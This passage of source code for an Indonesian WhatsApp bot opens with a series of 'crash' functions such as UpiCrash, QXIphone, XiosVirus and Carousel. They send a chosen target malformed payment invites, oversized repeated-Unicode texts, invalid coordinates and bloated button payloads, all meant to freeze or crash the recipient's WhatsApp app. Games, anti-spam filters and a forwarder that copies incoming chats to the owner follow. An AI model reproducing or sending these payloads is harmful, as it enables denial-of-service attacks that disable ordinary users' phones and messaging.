    
async function func1(target) {
    await Xlesy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦹꦹꦹ".repeat(400000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function aipong(target) {
await Xlesy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
async function iponcrash(target) {
await Xlesy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await Xlesy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await Xlesy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}
//bug ios
async function UpiCrash(target) {
      await Xlesy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await Xlesy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await Xlesy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await Xlesy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

async function newsLetter(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "NassCrashV1" + "ી".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await Xlesy.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }

    async function SqCrash(target) {
      await Xlesy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await Xlesy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await Xlesy.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/GxyenDev",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayIos(target) {
      await Xlesy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await Xlesy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      Xlesy.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
        //
    async function XiosVirus(target) {
      Xlesy.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

        async function Carousel(Pe) {
            const msg = generateWAMessageFromContent(
                Pe, {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: {
                                    text: `\0`
                                },
                                carouselMessage: {
                                    cards: [{
                                        header: {
                                            ...(await prepareWAMessageMedia({
                                                image: {
                                                    url: "https://files.catbox.moe/n1nqsc.jpg"
                                                }
                                            }, {
                                                upload: Xlesy.waUploadToServer
                                            })),
                                            title: `\0`,
                                            gifPlayback: true,
                                            subtitle: '\0',
                                            hasMediaAttachment: true
                                        },
                                        body: {
                                            text: `𝐂𝐚𝐫𝐨𝐮𝐬𝐞𝐥 𝐂𝐫𝐚𝐬𝐡` + "ꦾ".repeat(120000)
                                        },
                                        footer: {
                                            text: "\0"
                                        },
                                        nativeFlowMessage: {
                                            buttons: [{
                                                    name: "single_select",
                                                    buttonParamsJson: JSON.stringify({
                                                        title: "😂۞Xlesyܢ𝐎𝐯𝐞𝐫𝐅𝐥𝐨⃕𝐰⃟😂 ",
                                                        sections: []
                                                    })
                                                },
                                                {
                                                    name: "single_select",
                                                    buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                                },
                                                {
                                                    name: "call_permission_request",
                                                    buttonParamsJson: "{}"
                                                },
                                                {
                                                    name: "mpm",
                                                    buttonParamsJson: "{}"
                                                },
                                                {
                                                    name: "single_select",
                                                    buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                                },
                                                {
                                                    name: "quick_reply",
                                                    buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                                },
                                                {
                                                    name: "cta_url",
                                                    buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://www.youtube.com/@Gxyenn\",\"merchant_url\":\"https://www.youtube.com/@Gxyenn\"}"
                                                },
                                                {
                                                    name: "cta_call",
                                                    buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                                },
                                                {
                                                    name: "cta_copy",
                                                    buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                                },
                                                {
                                                    name: "cta_reminder",
                                                    buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                                },
                                                {
                                                    name: "cta_cancel_reminder",
                                                    buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                                },
                                                {
                                                    name: "address_message",
                                                    buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                                },
                                                {
                                                    name: "send_location",
                                                    buttonParamsJson: "\0"
                                                }
                                            ]
                                        }
                                    }],
                                    messageVersion: 1,
                                }
                            }
                        }
                    }
                }, {
                    quoted: m
                }
            );
            await Xlesy.relayMessage(Pe, msg.message, {
                messageId: msg.key.id,
            });
              console.log("Success! Crl Button Sent")
        }
        //animecari
        const axios = require("axios");
        const searchAnime = async (Xlesy, m, query) => {
            try {
                if (!query) return Replyx("⚠️ Masukkan judul anime atau genre yang ingin dicari!")

                let url = `https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=5`;
                let response = await axios.get(url)
                let results = response.data.data

                if (!results || results.length === 0) {
                    return Replyx("❌ Anime tidak ditemukan!");
                }

                let animeList = results.slice(0, 3).map((anime, index) => {
                    return `*${index + 1}. ${anime.title}*\n🎭 *Genre:* ${anime.genres.map(g => g.name).join(", ")}\n📅 *Tayang:* ${anime.aired.string}\n⭐ *Skor:* ${anime.score}\n🔗 *Link:* [MyAnimeList](${anime.url})\n`;
                }).join("\n\n")

                let imageUrl = results[0].images.jpg.large_image_url;

                await Xlesy.sendMessage(m.chat, {
                    image: {
                        url: imageUrl
                    },
                    caption: `🔍 *Hasil Pencarian Anime:*\n\n${animeList}`
                }, {
                    quoted: fkontak1
                })

            } catch (err) {
                console.error("Error fetching anime:", err)
                Replyx("⚠️ Server Sedang Offline .")
            }
        }

        // Auto Read
        if (m.message && m.key.remoteJid !== 'status@broadcast') {
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]:'), chalk.bgGreen(new Date), chalk.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.bgCyanBright('[ DARI ] :'), chalk.bgYellow(m.pushName || (isCreator ? 'Bot' : 'Anonim')), chalk.bgHex('#FF449F')(m.sender), chalk.bgHex('#FF5700')(m.isGroup ? m.metadata.subject : m.chat.endsWith('@newsletter') ? 'Newsletter' : 'Private Chat'), chalk.bgBlue('(' + m.chat + ')')));
            if (db.set[botNumber].autoread && Xlesy.public) await Xlesy.readMessages([m.key])
        }

        //notif
        const fs = require('fs');
        const configPath = './lib/notif.json';

        // Fungsi untuk membaca konfigurasi
        function loadConfig() {
            if (!fs.existsSync(configPath)) {
                return {
                    notifChat: true
                }; // Default ON jika file tidak ada
            }
            return JSON.parse(fs.readFileSync(configPath));
        }

        // Fungsi untuk menyimpan konfigurasi
        function saveConfig(newConfig) {
            fs.writeFileSync(configPath, JSON.stringify(newConfig, null, 2));
        }

        let notif = loadConfig(); // Load notif saat bot dimulai

        switch (command) {
            case 'notifon':
                notif.notifChat = true;
                saveConfig(notif);
                Xlesy.sendMessage(m.chat, {
                    text: '✅ Notifikasi chat masuk telah sukses *diaktifkan*.'
                }, {
                    quoted: fkontak1
                });
                break;

            case 'notifoff':
                notif.notifChat = false;
                saveConfig(notif);
                Xlesy.sendMessage(m.chat, {
                    text: '✅ Notifikasi chat masuk telah sukses *dinonaktifkan*.'
                }, {
                    quoted: fkontak1
                });
                break;
        }

        if (!m.key.fromMe && notif.notifChat) {
            let ownerNumber = `${owner}@s.whatsapp.net`; // Ganti dengan nomor WhatsApp owner
            let sender = `@${m.sender.split('@')[0]}`;
            let chatName = '⚡ _\`Chat Pribadi\`_ '; // Default jika pesan bukan dari grup

            // Cek apakah pesan berasal dari grup
            if (m.isGroup) {
                try {
                    let groupMetadata = await Xlesy.groupMetadata(m.chat);
                    chatName = `📢 *\`Grup:\`* ${groupMetadata.subject}`;
                } catch (error) {
                    chatName = '📢 *\`Grup:\`* Tidak Dapat Diambil';
                }
            }

            let messageContent = m.text || '[Media]';

            // **Cek apakah pesan berasal dari status atau saluran**
            if (m.chat.endsWith('@broadcast') || m.chat.endsWith('@channel')) {
                return; // **Abaikan pesan dari status atau saluran**
            }

            let notifMsg = `🐬 _*Notifikasi Chat Masuk*_\n\n👤 _*\`From:\`*_${sender}\n${chatName}\n💬 _\`Messages\`_ *:* ${messageContent}\n\nGunakan *replay/replay1 ${m.sender.split('@')[0]} [pesan]* untuk membalas.`;

            Xlesy.sendMessage(ownerNumber, {
                text: notifMsg,
                mentions: [m.sender]
            }, {
                quoted: ftroli
            });
        }

        // Group Settings
        if (m.isGroup) {
            // Mute
            if (db.groups[m.chat].mute && !isCreator) {
                return
            }

            // Anti Delete
            if (m.type == 'protocolMessage' && db.groups[m.chat].antidelete && !isCreator && m.isBotAdmin && !m.isAdmin) {
                const mess = chatUpdate.messages[0].message.protocolMessage
                if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
                    const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
                    chats.msg.contextInfo = {
                        mentionedJid: [chats.key.participant],
                        isForwarded: true,
                        forwardingScore: 1,
                        quotedMessage: {
                            conversation: '*Anti Delete❗*'
                        },
                        ...chats.key
                    }
                    const pesan = chats.type === 'conversation' ? {
                        extendedTextMessage: {
                            text: chats.msg,
                            contextInfo: {
                                mentionedJid: [chats.key.participant],
                                isForwarded: true,
                                forwardingScore: 1,
                                quotedMessage: {
                                    conversation: '*Anti Delete❗*'
                                },
                                ...chats.key
                            }
                        }
                    } : {
                        [chats.type]: chats.msg
                    }
                    await Xlesy.relayMessage(m.chat, pesan, {})
                }
            }

            // Anti Link Group
            if (db.groups[m.chat].antilink && !isCreator && m.isBotAdmin && !m.isAdmin) {
                if (budy.match('chat.whatsapp.com/')) {
                    const isGcLink = new RegExp(`https://chat.whatsapp.com/${await Xlesy.groupInviteCode(m.chat)}`, 'i').test(m.text);
                    if (isGcLink) return
                    await Xlesy.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.id,
                            participant: m.sender
                        }
                    })
                    await Xlesy.relayMessage(m.chat, {
                        extendedTextMessage: {
                            text: `Terdeteksi @${m.sender.split('@')[0]} Mengirim Link Group\nMaaf Link Harus Di Hapus..`,
                            contextInfo: {
                                mentionedJid: [m.key.participant],
                                isForwarded: true,
                                forwardingScore: 1,
                                quotedMessage: {
                                    conversation: '*Anti Link❗*'
                                },
                                ...m.key
                            }
                        }
                    }, {})
                }
            }

            // Anti Virtex Group
            if (db.groups[m.chat].antivirtex && !isCreator && m.isBotAdmin && !m.isAdmin) {
                if (budy.length > 6000) {
                    await Xlesy.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.id,
                            participant: m.sender
                        }
                    })
                    await Xlesy.relayMessage(m.chat, {
                        extendedTextMessage: {
                            text: `Terdeteksi @${m.sender.split('@')[0]} Mengirim Virtex..`,
                            contextInfo: {
                                mentionedJid: [m.key.participant],
                                isForwarded: true,
                                forwardingScore: 1,
                                quotedMessage: {
                                    conversation: '*Anti Virtex❗*'
                                },
                                ...m.key
                            }
                        }
                    }, {})
                    await Xlesy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                }
                if (m.msg.nativeFlowMessage && m.msg.nativeFlowMessage.messageParamsJson && m.msg.nativeFlowMessage.messageParamsJson.length > 3500) {
                    await Xlesy.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.id,
                            participant: m.sender
                        }
                    })
                    await Xlesy.relayMessage(m.chat, {
                        extendedTextMessage: {
                            text: `Terdeteksi @${m.sender.split('@')[0]} Mengirim Bug..`,
                            contextInfo: {
                                mentionedJid: [m.key.participant],
                                isForwarded: true,
                                forwardingScore: 1,
                                quotedMessage: {
                                    conversation: '*Anti Bug❗*'
                                },
                                ...m.key
                            }
                        }
                    }, {})
                    await Xlesy.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                }
            }

        }

        // Filter Bot
        if (m.isBot) return

        // Mengetik & Anti Spam
        if (Xlesy.public && isCmd) {
            if (db.set[botNumber].autotyping) {
                await Xlesy.sendPresenceUpdate('composing', m.chat)
            }
            if (db.set[botNumber].antispam && antiSpam.isFiltered(m.sender)) {
                console.log(chalk.bgRed('[ SPAM ] : '), chalk.black(chalk.bgHex('#1CFFF7')(`From -> ${m.sender}`, {
                    quoted: fkontak1
                }), chalk.bgHex('#E015FF')(` In ${m.isGroup ? m.chat : 'Private Chat'}`)))
                return Replyx('Yare-yare Beri Jeda Dong 5-10 Seconds!..', {
                    quoted: fkontak1
                })
            }
        }

        if (isCmd && !isCreator) antiSpam.addFilter(m.sender)

        // Salam
        if (/^a(s|ss)alamu('|)alaikum(| )(wr|)( |)(wb|)$/.test(budy?.toLowerCase())) {
            const jwb_salam = ['Wa\'alaikumusalam', 'Wa\'alaikumusalam wr wb', 'Wa\'alaikumusalam Warohmatulahi Wabarokatuh']
            m.reply(pickRandom(jwb_salam), {
                quoted: fkontak1
            })
        }

        // Waktu Sholat
        const jadwalSholat = {
            Subuh: '04:30',
            Dzuhur: '12:06',
            Ashar: '15:21',
            Maghrib: '18:08',
            Isya: '19:28'
        }
        if (!this.intervalSholat) this.intervalSholat = null;
        if (!this.waktusholat) this.waktusholat = {};
        if (this.intervalSholat) clearInterval(this.intervalSholat);
        setTimeout(() => {
            this.intervalSholat = setInterval(async () => {
                const jamSholat = moment.tz('Asia/Jakarta').locale('id').format('HH:mm');
                for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
                    if (jamSholat === waktu && this.waktusholat[sholat] !== jamSholat) {
                        this.waktusholat[sholat] = jamSholat
                        for (const [idnya, settings] of Object.entries(db.groups)) {
                            if (settings.waktusholat) {
                                await Xlesy.sendMessage(idnya, {
                                    text: `Waktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*${waktu.slice(0, 5)}*\n_untuk wilayah Jakarta dan sekitarnya._`
                                }, {
                                    ephemeralExpiration: m.expiration || 0
                                }).catch(e => {})
                            }
                        }
                    }
                }
            }, 60000)
        }, time_end);

        // Cek Expired
        prem.expiredCheck(Xlesy, premium);

        // TicTacToe
        let room = Object.values(tictactoe).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                m.reply({
                    '-3': 'Game telah berakhir',
                    '-2': 'Invalid',
                    '-1': 'Posisi Invalid',
                    0: 'Posisi Invalid',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            if (isWin) {
                db.users[m.sender].limit += 3
                db.users[m.sender].uang += 3000
            }
            let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\n${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\n\nKetik *nyerah* untuk menyerah dan mengakui kekalahan`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) await Xlesy.sendMessage(room.x, {
                text: str,
                mentions: parseMention(str)
            }, {
                quoted: fkontak1
            })
            await Xlesy.sendMessage(room.o, {
                text: str,
                mentions: parseMention(str)
            }, {
                quoted: fkontak1
            })
            if (isTie || isWin) {
                delete tictactoe[room.id]
            }
        }

        // Suit PvP
        let roof = Object.values(suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
        if (roof) {
            let win = ''
            let tie = false
            if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
                if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
                    m.reply(`@${roof.p2.split`@`[0]} menolak suit,\nsuit dibatalkan`, {
                        quoted: fkontak1
                    })
                    delete suit[roof.id]
                    return !0
                }
                roof.status = 'play';
                roof.asal = m.chat;
                clearTimeout(roof.waktu);
                m.reply(`Suit telah dikirimkan ke chat\n\n@${roof.p.split`@`[0]} dan @${roof.p2.split`@`[0]}\n\nSilahkan pilih suit di chat masing-masing klik https://wa.me/${botNumber.split`@`[0]}`, {
                    quoted: fkontak1
                })
                if (!roof.pilih) Xlesy.sendMessage(roof.p, {
                    text: `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`
                }, {
                    quoted: fkontak1
                })
                if (!roof.pilih2) Xlesy.sendMessage(roof.p2, {
                    text: `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`
                }, {
                    quoted: fkontak1
                })
                roof.waktu_milih = setTimeout(() => {
                    if (!roof.pilih && !roof.pilih2) m.reply(`Kedua pemain tidak niat main,\nSuit dibatalkan`, {
                        quoted: fkontak1
                    })
                    else if (!roof.pilih || !roof.pilih2) {
                        win = !roof.pilih ? roof.p2 : roof.p
                        m.reply(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, {
                            quoted: fkontak1
                        })
                    }
                    delete suit[roof.id]
                    return !0
                }, roof.timeout)
            }
            let jwb = m.sender == roof.p
            let jwb2 = m.sender == roof.p2
            let g = /gunting/i
            let b = /batu/i
            let k = /kertas/i
            let reg = /^(gunting|batu|kertas)/i;

            if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
                roof.pilih = reg.exec(m.text.toLowerCase())[0];
                roof.text = m.text;
                m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`, {
                    quoted: fkontak1
                });
                if (!roof.pilih2) Xlesy.sendMessage(roof.p2, {
                    text: '_Lawan sudah memilih_\nSekarang giliran kamu'
                })
            }
            if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
                roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
                roof.text2 = m.text
                m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`, {
                    quoted: fkontak1
                })
                if (!roof.pilih) Xlesy.sendMessage(roof.p, {
                    text: '_Lawan sudah memilih_\nSekarang giliran kamu'
                })
            }
            let stage = roof.pilih
            let stage2 = roof.pilih2
            if (roof.pilih && roof.pilih2) {
                clearTimeout(roof.waktu_milih)
                if (b.test(stage) && g.test(stage2)) win = roof.p
                else if (b.test(stage) && k.test(stage2)) win = roof.p2
                else if (g.test(stage) && k.test(stage2)) win = roof.p
                else if (g.test(stage) && b.test(stage2)) win = roof.p2
                else if (k.test(stage) && b.test(stage2)) win = roof.p
                else if (k.test(stage) && g.test(stage2)) win = roof.p2
                else if (stage == stage2) tie = true
                db.users[roof.p == win ? roof.p : roof.p2].limit += tie ? 0 : 3
                db.users[roof.p == win ? roof.p : roof.p2].uang += tie ? 0 : 3000
                Xlesy.sendMessage(roof.asal, {
                    text: `_*Hasil Suit*_${tie ? '\nSERI' : ''}\n\n@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}\n\nPemenang Mendapatkan\n*Hadiah :* Uang(3000) & Limit(3)`.trim(),
                    mentions: [roof.p, roof.p2]
                }, {
                    quoted: fkontak1
                })
                delete suit[roof.id]
            }
        }

        // Tebak Bomb
        let pilih = '🌀',
            bomb = '💣';
        if (m.sender in tebakbom) {
            if (!/^[1-9]|10$/i.test(body) && !isCmd && !isCreator) return !0;
            if (tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
            if (tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
                tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
                tebakbom[m.sender].pick++;
                Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '❌',
                        key: m.key
                    }
                })
                tebakbom[m.sender].bomb--;
                tebakbom[m.sender].nyawa.pop();
                let brd = tebakbom[m.sender].board;
                if (tebakbom[m.sender].nyawa.length < 1) {
                    await m.reply(`*GAME TELAH BERAKHIR*\nKamu terkena bomb\n\n ${brd.join('')}\n\n*Terpilih :* ${tebakbom[m.sender].pick}\n_Pengurangan Limit : 1_`, {
                        quoted: fkontak1
                    });
                    Xlesy.sendMessage(m.chat, {
                        react: {
                            text: '😂',
                            key: m.key
                        }
                    })
                    delete tebakbom[m.sender];
                } else await m.reply(`*PILIH ANGKA*\n\nKamu terkena bomb\n ${brd.join('')}\n\nTerpilih: ${tebakbom[m.sender].pick}\nSisa nyawa: ${tebakbom[m.sender].nyawa}`, {
                    quoted: fkontak1
                });
                return !0;
            }
            if (tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
                tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
                tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
                tebakbom[m.sender].pick++;
                tebakbom[m.sender].lolos--;
                let brd = tebakbom[m.sender].board;
                if (tebakbom[m.sender].lolos < 1) {
                    db.users[m.sender].uang += 6000
                    await m.reply(`*KAMU HEBAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Terpilih :* ${tebakbom[m.sender].pick}\n*Sisa nyawa :* ${tebakbom[m.sender].nyawa}\n*Bomb :* ${tebakbom[m.sender].bomb}\nBonus Uang 💰 *+6000*`, {
                        quoted: fkontak1
                    });
                    delete tebakbom[m.sender];
                } else m.reply(`*PILIH ANGKA*\n\n${brd.join('')}\n\nTerpilih : ${tebakbom[m.sender].pick}\nSisa nyawa : ${tebakbom[m.sender].nyawa}\nBomb : ${tebakbom[m.sender].bomb}`, {
                    quoted: fkontak1
                })
            }
        }

        // Akinator
        if (m.sender in akinator) {
            if (m.quoted && akinator[m.sender].key == m.quoted.id) {
                if (budy == '5') {
                    if (akinator[m.sender]?.progress?.toFixed(0) == 0) {
                        delete akinator[m.sender]
                        return m.reply(`🎮 Akinator Game End!\nWith *0* Progress`, {
                            quoted: fkontak1
                        })
                    }
                    akinator[m.sender].isWin = false
                    await akinator[m.sender].cancelAnswer()
                    let {
                        key
                    } = await m.reply(`🎮 Akinator Game Back :\n\n@${m.sender.split('@')[0]} (${akinator[m.sender].progress.toFixed(2)}) %\n${akinator[m.sender].question}\n\n- 0 - Ya\n- 1 - Tidak\n- 2 - Tidak Tau\n- 3 - Mungkin\n- 4 - Mungkin Tidak\n- 5 - ${akinator[m.sender]?.progress?.toFixed(0) == 0 ? 'End' : 'Back'}`, {
                        quoted: fkontak1
                    })
                    akinator[m.sender].key = key.id
                } else if (akinator[m.sender].isWin && ['benar', 'ya'].includes(budy.toLowerCase())) {
                    Xlesy.sendMessage(m.chat, {
                        react: {
                            text: '🎊',
                            key: m.key
                        }
                    })
                    delete akinator[m.sender]
                } else {
                    if (!isNaN(budy) && budy.match(/^[0-4]$/) && budy) {
                        if (akinator[m.sender].isWin) {
                            let {
                                key
                            } = await m.reply({
                                image: {
                                    url: akinator[m.sender].sugestion_photo
                                },
                                caption: `🎮 Akinator Answer :\n\n@${m.sender.split('@')[0]}\nDia adalah *${akinator[m.sender].sugestion_name}*\n_${akinator[m.sender].sugestion_desc}_\n\n- 5 - Back\n- *Ya* (untuk keluar dari sesi)`,
                                contextInfo: {
                                    mentionedJid: [m.sender]
                                }
                            });
                            akinator[m.sender].key = key.id
                        } else {
                            await akinator[m.sender].answer(budy)
                            if (akinator[m.sender].isWin) {
                                let {
                                    key
                                } = await m.reply({
                                    image: {
                                        url: akinator[m.sender].sugestion_photo
                                    },
                                    caption: `🎮 Akinator Answer :\n\n@${m.sender.split('@')[0]}\nDia adalah *${akinator[m.sender].sugestion_name}*\n_${akinator[m.sender].sugestion_desc}_\n\n- 5 - Back\n- *Ya* (untuk keluar dari sesi)`,
                                    contextInfo: {
                                        mentionedJid: [m.sender]
                                    }
                                });
                                akinator[m.sender].key = key.id
                            } else {
                                let {
                                    key
                                } = await m.reply(`🎮 Akinator Game :\n\n@${m.sender.split('@')[0]} (${akinator[m.sender].progress.toFixed(2)}) %\n${akinator[m.sender].question}\n\n- 0 - Ya\n- 1 - Tidak\n- 2 - Tidak Tau\n- 3 - Mungkin\n- 4 - Mungkin Tidak\n- 5 - Back`, {
                                    quoted: fkontak1
                                })
                                akinator[m.sender].key = key.id
                            }
                        }
                    }
                }
            }
        }

        // Game
        const games = {
            tebaklirik,
            tekateki,
            tebaklagu,
